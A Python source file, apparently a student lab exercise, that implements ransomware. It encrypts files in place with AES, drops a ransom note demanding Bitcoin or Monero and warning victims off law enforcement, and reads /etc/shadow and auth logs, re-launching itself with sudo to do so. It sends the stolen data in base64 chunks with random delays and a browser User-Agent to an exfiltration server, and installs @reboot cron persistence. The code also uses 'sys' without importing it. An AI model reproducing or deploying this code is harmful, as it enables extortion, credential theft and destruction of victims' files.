import os 
import platform
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import time
import random
import discover
import modify
import requests
import subprocess
import base64


HARDCODED_KEY = b'veryweakpassword'

DESKTOP_PATH = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') 

COMPATIBLE_OS = "Linux"
COMPATIBLE_OS_VERSION = "6.8.11-arm64"

SCRIPT_PATH = os.path.abspath(__file__)
PROFILE_PATH = os.path.expanduser("~/.bashrc")

###################### CHECKING OS COMPATIBILITY ###################
def check_os(os, os_version): 
	return os == platform.system() and os_version == platform.release()
	
###################### SAVING MESSAGE FILE ###########################
def save_text(desktop): 

    with open(f"{desktop}/PLEASE_READ.txt", "w") as f: 
        content = '''!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important files have been encrypted using a strong encryption algorithm.
To regain access to your files, you need to follow the instructions below.

1. **Do Not Panic**: Your files are safe, but they are encrypted. Do not attempt to decrypt them yourself; it will only lead to data loss.

2. **Payment Instructions**:
   - **Cryptocurrency**: We accept Bitcoin (BTC) or Monero (XMR) as payment. 
   - **Amount**: 1.0 BTC or 10.0 XMR
   - **Payment Address**: 
     - Bitcoin: `1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T`
     - Monero: `43tfd...your_monero_address_here...y5dV2`

3. **Deadline**: You have 72 hours to make the payment. After this period, the decryption key will be destroyed, and your files will remain inaccessible.

4. **How to Contact Us**:
   - **Email**: `ransom_support@example.com`
   - **Dark Web Chat**: [link_to_dark_web_chat]

5. **Proof of Decryption**:
   - After making the payment, send us a transaction ID and a screenshot of the payment confirmation. We will provide you with a decryption tool.

**Warning**: If you contact law enforcement or try to remove the ransomware yourself, your files will be permanently lost. 

**Backup Reminder**: This incident highlights the importance of regular backups. Always keep backups of your important files to avoid such situations in the future.

**Good Luck!**
'''
        f.write(content)


########################## MAKING IT PERSISTANT ######################
def add_cron_job_reboot(script_path):
    # Define the cron job to be added
    cron_job = f"@reboot /usr/bin/python3 /home/aarya/Desktop/LabQ1/server_exfil/server.py\n@reboot /usr/bin/python3 {script_path}\n"

    try:
        # Get the current crontab
        current_crontab = subprocess.check_output(['crontab', '-l']).decode('utf-8')
    except subprocess.CalledProcessError:
        # No crontab exists yet
        current_crontab = ''

    # Check if the job is already in the crontab
    if cron_job in current_crontab:
        print("Cron job already exists.")
        return

    # Add the new cron job
    new_crontab = current_crontab + cron_job
    with open('my_crontab', 'w') as f:
        f.write(new_crontab)

    # Update the crontab
    subprocess.run(['crontab', 'my_crontab'])
    os.remove('my_crontab')
    print("Cron job added successfully.")

########################## DATA EXFILTRATION #######################

url = "http://0.0.0.0:5000/exfiltrate"  # Replace with your server's IP address or domain
def stealthy_exfiltrate(url, data):
    # Encode data
    encoded_data = base64.b64encode(data.encode()).decode()
    # Split data into smaller chunks
    chunks = [encoded_data[i:i+1024] for i in range(0, len(encoded_data), 1024)]
    for chunk in chunks:
        # Random delay
        time.sleep(random.uniform(1, 5))
        # Post data to server
        response = requests.post(url, data={'data': chunk}, headers={'User-Agent': 'Mozilla/5.0'})
        print(response.status_code)
       
def gather_data(key): 
    data = {"key": key}
    files_to_read = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/network/interfaces", "/var/log/syslog", "/var/log/auth.log", "/var/log/dmesg", "/var/log/messages"]
    for file in files_to_read:
        try:
            # Check if the file is one that typically requires root access
            if file in ["/etc/shadow"]:
                # If not running as root, re-run the script with sudo
                if os.geteuid() != 0:
                    print(f"Root permissions required to open {file}. Elevating privileges...")
                    subprocess.check_call(['sudo', sys.executable] + sys.argv)
                    sys.exit(0)  # Exit the current process after re-launching with sudo
            with open(file, "rb") as f: 
                file_content = f.read()
                data[file.upper()] = file_content
        except PermissionError as e:
            data[file.upper()] = str(e).encode('utf-8')  # Save the error message
        except Exception as e:
            data[file.upper()] = str(e).encode('utf-8')  # Save any other errors
            
    return data
    
    	
####################### RANSOMWARE STUFF############################



def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser



	
def ransome_ware(path):
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    
    if (not check_os(COMPATIBLE_OS, COMPATIBLE_OS_VERSION)): 
    	print("OS or OS Version is incompatible with this Malware")
    	return False
    else: 
    	print("System is compatible to use with this software \n\n Encrypting Files...")

    if decrypt:
        
        key = input('Enter Your Key> ')
        key = key.encode('utf-8')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        if HARDCODED_KEY:
            key = HARDCODED_KEY
		
		# don't uncomment below, unless you really want to ruin your files
        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = [path + '/test']
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        save_text(DESKTOP_PATH)
        data = gather_data(key)
        
        stealthy_exfiltrate(url, str(data)) 
        
         # post encrypt stuff
         # desktop picture
         # icon, etc

ransome_ware(DESKTOP_PATH) # change start directory by adjusting param
add_cron_job_reboot(SCRIPT_PATH)
